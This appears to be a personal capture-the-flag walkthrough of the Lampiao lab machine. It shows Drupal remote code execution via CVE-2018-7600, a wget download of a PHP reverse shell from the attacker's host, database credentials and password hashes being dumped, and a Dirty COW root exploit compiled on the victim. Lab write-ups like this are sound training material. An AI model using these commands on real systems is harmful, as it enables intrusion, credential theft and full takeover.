# Lampiao


# Netdiscover
![[Pasted image 20220505075716.png]]

```text
192.168.1.141
```

# Port scan
```text
22/tcp   open  ssh        syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  tcpwrapped syn-ack ttl 64
1898/tcp open  http       syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))

```


# Port 80
![[Pasted image 20220505112416.png]]

# Port 1898

![[Pasted image 20220505112501.png]]

Robots.txt has interesting entry: `Disallow/CHANGELOG.txt`

![[Pasted image 20220505112942.png]]

Found an [exploit for drupal 7 < 7.57] (https://github.com/pimps/CVE-2018-7600)

### RCE via CVE-2018-7600
```bash
./drupa7-CVE-2018-7600.py -c whoami http://lampiano:1898/
```

![[Pasted image 20220505113408.png]]

# Reverse php webshell
copy the binary to your working folder
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```
Remove the comments and change IP/port

host file on webserver
```bash
python3 -m http.server 82
```

Download to victim
```bash
./drupa7-CVE-2018-7600.py -c 'wget http://192.168.1.112:88/php-reverse-shell.php' http://lampiano:1898/
```

Activate the shell by visiting the webpage
```
http://lampiano:1898/shell.php
```

Fix the shell
```python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```


# linPEAS findings
![[Pasted image 20220505121649.png]]

![[Pasted image 20220505121707.png]]

![[Pasted image 20220505121911.png]]

Found DB creds in `/var/www/html/sites/default/settings.php`
![[Pasted image 20220505122159.png]]

Get on the SQL db
```bash
mysql -u drupaluser -pVirgulino
```

Dump the users table

```mysql
+-------+---------------------------------------------------------+
| name  | pass                                                    |
+-------+---------------------------------------------------------+
|       |                                                         |
| tiago | $S$DNZ5o1k/NY7SUgtJvjPqNl40kHKwn4yXy2eroEnOAlpmT0TJ9Sx8 |
| Eder  | $S$Dv5orvhi7okjmViImnVPmVgfwJ2U..PNK4E9IT/k7Lqz9GZRb7tY |
| admin | $S$DQRp/JT8KnSM8cFRgzOlKL83DnHt6yxXieQ5hcq3me2bYeiA5p8A |
+-------+---------------------------------------------------------+
```

Tried cracking the hashes to no aval. Drupal 7 hashes take forever to crack, so I had plenty of time to think. PASSWORD REUSE. I should have immediately tried to `su` with the db password.

![[Pasted image 20220505130229.png]]

At this point we can drop the webshell and switch to ssh if desired.

## Linpeas findings

![[Pasted image 20220505131959.png]]

[Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester.git) picked up `Dirty Cow 2` as a possible exploit.

```bash
searchsploit -m 40839
```

Compile & run on victim
```bash
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil && ./dcow -s
```

# Root Flag
![[Pasted image 20220505163611.png]]


# Additional Exploitation methods
Able to break into `tiago` by scraping a detailed post and feeding all the words as a password through ssh. It only takes about 7 seconds to find the correct password this way.
![[Pasted image 20220505160555.png]]

